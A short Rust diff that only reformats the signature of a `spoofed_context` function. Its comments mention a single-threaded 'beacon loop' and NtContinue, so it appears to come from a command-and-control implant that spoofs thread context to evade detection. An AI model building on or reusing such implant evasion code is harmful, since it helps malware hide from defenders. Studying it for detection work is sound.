@@ -193,7 +193,11 @@ static mut CTX_BUF: Context = Context { buf: [0u8; 1232] };
 /// The returned `*mut Context` points to a static mutable buffer that is
 /// overwritten on each call. This is safe because the single-threaded beacon
 /// loop guarantees NtContinue fires before the next `spoofed_context` call.
-pub unsafe fn spoofed_context(target_rip: u64, real_rsp: u64, saved_ctx: *const Context) -> *mut Context {
+pub unsafe fn spoofed_context(
+    target_rip: u64,
+    real_rsp: u64,
+    saved_ctx: *const Context,
+) -> *mut Context {
     use core::ptr::addr_of_mut;
     let ctx = &mut *addr_of_mut!(CTX_BUF);
     // Zero the buffer so stale fields from a previous cycle don't leak.
